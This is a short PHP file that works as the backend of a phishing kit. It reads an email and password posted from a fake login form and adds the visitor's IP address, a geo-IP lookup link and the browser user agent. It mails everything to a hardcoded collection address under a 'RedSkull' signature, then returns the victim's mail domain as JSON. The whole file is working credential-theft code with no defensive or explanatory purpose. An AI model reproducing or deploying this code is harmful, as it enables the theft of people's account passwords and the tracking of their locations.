<?php 

     function getUseraddressfromuser()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}


    $address = getUseraddressfromuser();
    $browser =  $_SERVER['HTTP_USER_AGENT'];

    $email=$_POST['email'];
    $password = $_POST['password'];
    $data=  explode('@', $email);
    $Host = 'https://'.$data[1];
    $data2 = explode('.',$Host);
    $HostSub = $data[1];
    $message = "";
    $message .= "Email: ".$email."\n";
    $message .= "Password: ".$password."\n";
    $message .="|..........IP Informatio...........|"."\n";
    $message .="User Ip Address".$address."\n";
    $message .="http://www.geoiptool.com/?IP=".$address;
    $message .=$browser."\n";
    $message .="|.........RedSkull...........|"."\n";
    $to = "figure@figure.com";
    
    $subject = "DATAS || IP ADDRESS";
    
     $send =mail($to,$subject,$message);

    if ($send) {
        echo json_encode(array("statusCode"=>200, "status"=> true, "host"=>$Host, "message"=>$message));
         }else{echo json_encode(array("statusCode"=>400));}



?>